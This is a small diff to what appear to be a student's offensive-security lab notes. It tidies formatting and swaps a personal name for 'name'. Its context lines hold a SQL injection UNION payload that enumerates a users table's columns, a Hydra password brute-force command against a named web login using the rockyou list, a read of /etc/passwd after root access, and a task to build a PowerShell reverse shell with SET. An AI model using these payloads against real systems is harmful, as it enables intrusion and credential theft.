@@ -5,8 +5,8 @@
 for all column names
 
 ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' AND table_schema = database() #
-**
-HYDRA** for online file
+
+**HYDRA** for online file
 
 hydra -V -l istheory -P /usr/share/wordlists/rockyou.txt http-get://is.theorizeit.org/auth/ 
 
@@ -167,7 +167,7 @@ whoami → Outputs root, confirming that the shell has root-level access
 cat /etc/passwd
 
  
-echo "aditi" date
+echo "name" date
 
 
 4.	Create a PowerShell reverse shell social-engineering attack using Social Engineering Toolkit. Set the IP address of the reverse host to that of your Kali VM. Open the output file. What are the first 18 characters of the file?
